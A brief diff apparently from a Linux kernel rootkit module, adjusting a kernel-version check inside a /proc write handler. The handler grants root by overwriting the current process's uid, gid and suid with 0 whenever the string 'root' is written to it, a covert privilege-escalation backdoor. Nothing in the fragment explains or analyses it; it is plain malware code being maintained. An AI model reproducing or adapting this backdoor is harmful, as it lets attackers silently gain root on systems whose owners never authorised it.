@@ -698,7 +698,7 @@ static ssize_t write_proc(struct file *filp,const char *buf,size_t count,loff_t 
     }
     if (strncmp(buf,"root", 4) == 0) {
         cred = (struct cred * )__task_cred(current);
-#if LINUX_VERSION_CODE < KERNEL_VERSION(2, 6, 29)
+#if LINUX_VERSION_CODE < KERNEL_VERSION(2, 6, 33)
         cred-> uid = 0;
         cred-> gid = 0;
         cred-> suid = 0;
